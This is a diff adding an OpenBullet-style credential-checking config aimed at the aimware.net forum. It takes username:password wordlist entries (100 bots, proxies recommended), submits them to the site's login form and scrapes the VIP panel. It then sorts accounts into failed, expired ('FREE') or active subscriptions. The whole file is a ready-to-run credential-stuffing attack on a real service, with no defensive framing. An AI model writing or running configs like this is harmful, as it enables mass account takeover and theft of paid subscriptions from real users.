@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Aimware",
+  "SuggestedBots": 100,
+  "LastModified": "2018-07-15T23:36:35.3088793+00:00",
+  "AdditionalInfo": "Proxies recommended.",
+  "Author": "SeaPound",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN REQUEST GET "https://aimware.net/forum/panel.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST REQUEST POST "https://aimware.net/forum/member.php" AutoRedirect=TRUE 
+  CONTENT "action=do_login&url=https%3A%2F%2Faimware.net%2Fforum%2Findex.php&quick_login=1&quick_username=<USER>&quick_password=<PASS>&quick_remember=no&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET_VIP_PANEL REQUEST GET "https://aimware.net/forum/panel.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" REGEX "<td class=\\"trow1\\"><span class=\\"smalltext\\"><strong>([^\\"]*)<\/strong><\/span><\/td><td class=\\"trow1\\" align=\\"center\\"><span class=\\"smalltext\\"><span style=\\"color:[^\\"]*\\">([^\\"]*)<\/span><\/td>" "|=====| [2] |=====| [1] |=====|" Recursive=TRUE -> CAP "Capped" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+    KEY "You are either not logged in or do not have permission to view this page" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Expired" 
+  KEYCHAIN Success OR 
+    KEY "Extend" 
